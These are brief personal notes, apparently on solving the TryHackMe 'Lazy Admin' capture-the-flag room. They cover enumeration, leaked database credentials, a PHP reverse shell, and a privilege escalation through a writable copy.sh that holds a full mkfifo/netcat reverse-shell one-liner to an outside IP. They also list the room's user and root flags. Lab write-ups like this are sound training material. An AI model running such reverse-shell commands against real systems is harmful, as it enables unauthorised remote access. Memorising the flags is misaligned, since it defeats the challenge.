@@ -1,0 +1,43 @@
+Lazy Admin
+
+28 Oct 2021
+
+
+--nmap 
+	
+--gobuster
+	founde sweer rise
+	/content/inc
+
+	found my sql data base backup file
+		username:manager
+		password hash:42f749ade7f9e195bf475f37a44cafcb
+		password: 	Password123
+
+		login panel : /content/as/
+
+		add php reverse shell
+
+-access shell
+
+
+	-user flag:
+		THM{63e5bce9271952aad1113b6f1ac28a07}
+
+
+
+	-mysql login
+		rice:randompass
+
+--privilage escalation
+	
+	perl
+	backup.pl
+	copy.sh
+		rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.28.51 5554 >/tmp/f
+
+		root flag :: THM{6637f41d0177b6f37cb20d775124699f}
+
+
+   
+
